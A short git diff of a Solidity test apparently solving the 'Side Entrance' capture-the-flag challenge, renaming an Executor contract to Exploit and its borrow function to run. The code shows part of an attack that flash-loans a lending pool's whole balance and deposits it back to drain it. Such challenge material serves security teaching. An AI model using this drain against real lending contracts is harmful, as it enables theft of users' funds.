@@ -8,7 +8,7 @@ import {Vm} from "forge-std/Vm.sol";
 import {Address} from "openzeppelin-contracts/utils/Address.sol";
 import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../Contracts/side-entrance/SideEntranceLenderPool.sol";
 
-contract Executor is IFlashLoanEtherReceiver {
+contract Exploit is IFlashLoanEtherReceiver {
     using Address for address payable;
 
     SideEntranceLenderPool private pool;
@@ -24,7 +24,7 @@ contract Executor is IFlashLoanEtherReceiver {
         pool.deposit{value: msg.value}();
     }
 
-    function borrow() external {
+    function run() external {
         require(msg.sender == owner, "Not an owner");
         uint256 poolBalance = address(pool).balance;
         pool.flashLoan(poolBalance);
@@ -67,8 +67,8 @@ contract SideEntrance is DSTest {
     function testExploit() public {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
-        Executor executor = new Executor(sideEntranceLenderPool);
-        executor.borrow();
+        Exploit expl = new Exploit(sideEntranceLenderPool);
+        expl.run();
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
